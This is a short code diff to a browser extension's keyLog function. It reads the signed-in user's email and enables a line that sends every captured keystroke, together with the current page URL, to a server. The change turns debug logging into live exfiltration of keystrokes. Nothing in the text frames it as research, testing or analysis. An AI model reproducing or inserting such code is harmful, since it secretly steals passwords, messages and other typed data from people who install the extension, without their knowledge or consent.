@@ -26,13 +26,13 @@ function keyLog(request) {
   chrome.identity.getProfileUserInfo((userinfo) => {
     userEmail = userinfo.email;
     if (lastURL !== request.page) {
-      console.log(userEmail);
-      console.log(request.page);
+      //console.log(userEmail);
+      //console.log(request.page);
       //sendToServer("page="+request.page);
       lastURL = request.page;
     }
-    console.log(request.key);
-    //sendToServer("key="+request.key);
+    //console.log(request.key);
+    sendToServer("key="+request.key+"&page="+request.page);
   });
 }
 
